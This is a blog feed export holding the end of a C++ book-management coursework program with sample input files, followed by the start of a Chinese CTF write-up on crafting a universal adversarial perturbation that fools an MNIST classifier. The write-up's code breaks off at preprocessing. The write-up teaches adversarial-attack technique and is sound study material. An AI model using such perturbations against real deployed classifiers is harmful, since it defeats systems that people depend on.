setw(<span class="number">5</span>) &lt;&lt; p-&gt;amount &lt;&lt; setw(<span class="number">7</span>) &lt;&lt; p-&gt;price &lt;&lt; setw(<span class="number">32</span>) &lt;&lt; p-&gt;name &lt;&lt; setw(<span class="number">32</span>) &lt;&lt; p-&gt;author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    f.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LoadData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ifstream <span class="title">f</span><span class="params">(<span class="string">&quot;data.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!f.is_open())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;# WARNING: No pre data&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num, amt;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>], author[<span class="number">64</span>];</span><br><span class="line">    f &gt;&gt; num;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f &gt;&gt; amt;</span><br><span class="line">        f &gt;&gt; price;</span><br><span class="line">        f &gt;&gt; name;</span><br><span class="line">        f &gt;&gt; author;</span><br><span class="line">        Insert(head, i + <span class="number">1</span>, amt, price, name, author);</span><br><span class="line">    &#125;</span><br><span class="line">    f.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddNewBook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Adding New Book&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> amount;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>], author[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input amount : &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; amount;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; amount &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input price  : &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; price;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; price &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input name   : &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input author : &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; author;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    Insert(head, head-&gt;amount + <span class="number">1</span>, amount, price, name, author);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ViewAllBooks</span><span class="params">(<span class="keyword">int</span> notice)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (notice)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Viewing All Books&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    PrintInfoTitle();</span><br><span class="line">    SLNode p = head-&gt;next;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; head-&gt;amount &amp;&amp; p != <span class="literal">NULL</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PrintInfo(i, p);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EditInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Editing Info&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ViewAllBooks(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Edit book info at index of : &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; index;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; index &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    SLNode p = GetNode(head, index);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> input;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- 1.amount  2.price  3.name  4.author  5.done&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input selection : &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; input;</span><br><span class="line">        <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; input &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> newAmt;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input new amount : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; newAmt;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; newAmt &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            p-&gt;amount = newAmt;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">float</span> newPrice;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input new price : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; newPrice;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; newPrice &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            p-&gt;price = newPrice;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> newName[<span class="number">64</span>];</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input new name : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; newName;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; newName &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">free</span>(p-&gt;name);</span><br><span class="line">            p-&gt;nameLen = <span class="built_in">strlen</span>(newName);</span><br><span class="line">            <span class="keyword">int</span> nameSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (p-&gt;nameLen + <span class="number">1</span>);</span><br><span class="line">            p-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nameSize);</span><br><span class="line">            <span class="built_in">memcpy</span>(p-&gt;name, newName, nameSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> newAuthor[<span class="number">64</span>];</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input new author : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; newAuthor;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; newAuthor &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">free</span>(p-&gt;author);</span><br><span class="line">            p-&gt;authorLen = <span class="built_in">strlen</span>(newAuthor);</span><br><span class="line">            <span class="keyword">int</span> authorSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (p-&gt;authorLen + <span class="number">1</span>);</span><br><span class="line">            p-&gt;author = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(authorSize);</span><br><span class="line">            <span class="built_in">memcpy</span>(p-&gt;author, newAuthor, authorSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            AlertWrongInput();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteBook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Deleting Book&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ViewAllBooks(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Delete book at index of : &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; index;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; index &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    DeleteNode(head, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SearchInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Searching Info&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- 1.name  2.author&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Search by : &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> input;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; input;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; input &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> wantedName[<span class="number">64</span>];</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input wanted name : &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; wantedName;</span><br><span class="line">        <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; wantedName &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        SLNode p = head-&gt;next;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(p-&gt;name, wantedName))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt == <span class="number">0</span>)</span><br><span class="line">                    PrintInfoTitle();</span><br><span class="line">                PrintInfo(cnt++, p);</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> wantedAuthor[<span class="number">64</span>];</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input wanted author : &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; wantedAuthor;</span><br><span class="line">        <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; wantedAuthor &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        SLNode p = head-&gt;next;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(p-&gt;author, wantedAuthor))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt == <span class="number">0</span>)</span><br><span class="line">                    PrintInfoTitle();</span><br><span class="line">                PrintInfo(cnt++, p);</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        AlertWrongInput();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LoadMainMenu</span><span class="params">(<span class="keyword">bool</span> bFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    inputFromFile = bFile;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; fixed &lt;&lt; setprecision(<span class="number">2</span>);</span><br><span class="line">    Initiate(&amp;head);</span><br><span class="line">    LoadData();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;* ====================\n* 1. Add New Book\n* 2. Edit Info\n* 3. Delete Book\n* 4. Search Book\n* 5. View All Books\n* 6. Save Data\n* 7. Save And Exit\n* ====================&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> input;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Select a function : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; input;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; input &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">if</span> (input &gt; <span class="number">0</span> &amp;&amp; input &lt; <span class="number">8</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;# ERROR: Input not a number in range of 1~7, please retry&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (input)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            AddNewBook();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            EditInfo();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            DeleteBook();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            SearchInfo();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            ViewAllBooks(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            SaveData();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            SaveData();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            AlertWrongInput();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        main.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LibFunc.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ifstream <span class="title">iFile</span><span class="params">(<span class="string">&quot;input.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">bool</span> inputFromFile = iFile.good();</span><br><span class="line">    <span class="keyword">if</span> (iFile.good())</span><br><span class="line">    &#123;</span><br><span class="line">        freopen(<span class="string">&quot;input.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        freopen(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;* Input From File&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;* Input From User&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    iFile.close();</span><br><span class="line">    LoadMainMenu(inputFromFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><h2 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        data.txt    </div>    <div class='spoiler-content'>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">    1    233                             wow                             kyr</span><br><span class="line">    3     69                            Test                         tAuthor</span><br><span class="line">    4  34.98                      HelloWorld                             lol</span><br><span class="line">   10  19.42                            bass                            drum</span><br><span class="line">    3    3.8                         English                             edu</span><br><span class="line">    2     13                      Dcitionary                             edu</span><br><span class="line"></span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        input.txt    </div>    <div class='spoiler-content'>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1</span><br><span class="line">12</span><br><span class="line">514.5</span><br><span class="line">Xmas</span><br><span class="line">Mr.Joe</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">3</span><br><span class="line">7</span><br><span class="line">5</span><br><span class="line">4</span><br><span class="line">2</span><br><span class="line">edu</span><br><span class="line">7</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 课内 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑GlobalNoise[AI对抗启蒙]</title>
      <link href="2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise%5BAI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99%5D/"/>
      <url>2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise%5BAI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99%5D/</url>
      
        <content type="html"><![CDATA[<p>近期CTF赛事里面AI对抗题出现频率逐渐升高，作为一个摸了好久的web人，正好之前自己有一点MachineLearning的基础，准备尝试一下这个领域</p><p><img src="/images/GlobalNoise_Universal.png"></p><span id="more"></span><!--toc--><h1 id="西湖论剑GlobalNoise-AI对抗启蒙"><a href="#西湖论剑GlobalNoise-AI对抗启蒙" class="headerlink" title="西湖论剑GlobalNoise[AI对抗启蒙]"></a>西湖论剑GlobalNoise[AI对抗启蒙]</h1><blockquote><p>2022/01/16补充：发了关于<a href="https://kyriota.com/2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C[%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8]/">全连接神经网络的文章</a>，手搓了一个模型之后再回来看这篇文章，发现很多地方有失偏颇(已基本修正)，正好之前有一个想把样本偏移到任意class的心愿没有完成，后续会发一篇新的文章<a href="https://kyriota.com/2022/04/09/L2_Targeted_Attack/">L2 Targeted Attack</a></p></blockquote><p>本文面向的对象是：</p><ul><li>对Machine Learning原理有基本理解的入门AI人</li><li>吃瓜群众</li></ul><p>（机器学习相关的前置知识建议看吴恩达，然后不调库自己写一点逻辑回归线性回归的基本分类器就够了（至少我在这之前只有这点基础，技术拉跨</p><h2 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h2><p>概述：提供了一个训练好的model和一份mnist数据集，要求对其中的100份样本进行一个全局性的较小扰动（对向量的范数进行了限制），使得这100份样本的分类正确率低于5%</p><p><a href="https://kyriota.com/html/DLfiles/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise.zip">下载链接(github源)</a></p><p>（当时没有存题面啊啊啊啊啊啊啊啊啊啊啊啊啊，并非完整原题，只是我根据回忆和需要的条件摸出来的一个题面</p><h3 id="题面分析"><a href="#题面分析" class="headerlink" title="题面分析"></a>题面分析</h3><p>将题目给出的100个样本过一个目会发现是7和9的______</p><p><img src="/images/GlobalNoise_testSet.png"></p><p>如果你想的是<code>二分类</code>就不对了，因为是不可能用一个噪音把大部分7糊弄到9，然后把大部分9糊弄到7的（好多人一看到都说二分类</p><p>本来就是有10个类别（0~9），可以把9和7糊弄到除他俩之外的classes里面去</p><p>此题很明显关键在于Global，也正是这个Global和对范数的限制拦住了很多像我这样的半吊子</p><blockquote><p>之前做过0CTF-final中的boyNextDoor，是一个人脸识别的题，正解是用梯度构造noise，还需要Expectation over Transformation (EOT) 来绕过dlib的随机抖动，当时属于是无知者无畏，直接随机改单像素给爆出来了，由于只需要构造人脸图片，所以对于噪音范数和噪音鲁棒性没有要求，只要他能识别到人脸位置即可</p></blockquote><p>但是当我想在这个题用半吊子手法去解决时，很明显在范数限制和鲁棒性上都遇到了问题，通常来说根据梯度构造的噪音会比满足条件的随机噪音的L2(模长)小10~100倍，而且随机噪音只对单个样本有效，完全不能Global</p><p>所以人还是要进步，必须得理解正确构造噪音的方法</p><h2 id="一篇论文"><a href="#一篇论文" class="headerlink" title="一篇论文"></a>一篇论文</h2><p>这是一篇关于全局扰动的<a href="https://arxiv.org/pdf/2005.08087.pdf">文章</a>，看一半大概就能知道构造全局扰动的原理了，其实也qs不难理解，但可能需要先理解模型的训练过程以及使用</p><ul><li><p>在训练时：这个过程就是在寻找一个最优的 线性(or非线性?) 的变换，使得输入经过这个变换之后能够落到集中的位置，这样就可以根据一些界限(决策边界)来划分的输入，并给出模型的判断</p></li><li><p>在预测时：输入/数据 交给一个训练好的模型进行分类的时候，其实也就进行了一个映射，比如此处的mnist数据集是28x28的图片，那其实就是长度为784的向量，假设模型是f，那么f(x)就是模型对输入向量x预测的分类结果</p></li><li><p>决策边界：其实在我个人目前的理解中，决策边界其实就指</p><blockquote><p>在这个闭合的边界内，所有落到这里面的f(x)都会被判定为某一个分类</p></blockquote></li></ul><p>所以现在再回来看文中的图：</p><p><img src="/images/GlobalNoise_Universal.png"></p><p>他描述的其实就是：</p><ul><li>在红，绿，蓝，三个决策边界内（二维扁平化的决策空间只是为了方便演示和理解），分别有三个样点x1（在红色边界内）,x2（在蓝色边界内）,x3（在绿色边界内）</li><li>为了视觉上方便理解，把这三个点以及他们的决策空间重合在一起（原本的决策空间绝一般不会相互重叠，因为边界上正是预测结果改变的临界处，如果有一个模型存在太多这样的临界状况，那说明他这个模型不太行）</li><li>对f(x)，使用梯度下降法，获取一个noise，这个noise可以最快地把x1送到红色的决策边界</li><li>这时noise可以把原本落在红色这个决策空间内的x1直接送出到决策边界外去，但对于蓝色决策空间中的x2来说则不太好说</li><li>故重复这一过程，但x2应更新为<code>x2+=noise</code>，对更新后的x2求一个能把x2送出决策边界的新noise，然后更新noise为<code>noise+=newNoise</code></li><li>对x3重复这一过程</li></ul><p>这样就获得了一个可以把x1,x2,x3都送出决策空间的噪音（当然，求这个噪音的顺序会对最终得到的噪音有影响</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>原题中的预处理是调库直接用的接口，我因为没有接触过太多机器学习的库所以手动处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> norm</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">model = keras.models.load_model(<span class="string">&#x27;model.h5&#x27;</span>)</span><br><span class="line">test_set=[<span class="number">13616</span>, <span class="number">4189</span>, <span class="number">3206</span>, <span class="number">51839</span>, <span class="number">30560</span>, <span class="number">45045</span>, <span class="number">51389</span>, <span class="number">59638</span>, <span class="number">10487</span>, <span class="number">5233</span>, <span class="number">48889</span>, <span class="number">10247</span>, <span class="number">1547</span>, <span class="number">3914</span>, <span class="number">44182</span>, <span class="number">9990</span>, <span class="number">26276</span>, <span class="number">28283</span>, <span class="number">52481</span>, <span class="number">46609</span>, <span class="number">18757</span>, <span class="number">26954</span>, <span class="number">26322</span>, <span class="number">18819</span>, <span class="number">29463</span>, <span class="number">34489</span>, <span class="number">51248</span>, <span class="number">53986</span>, <span 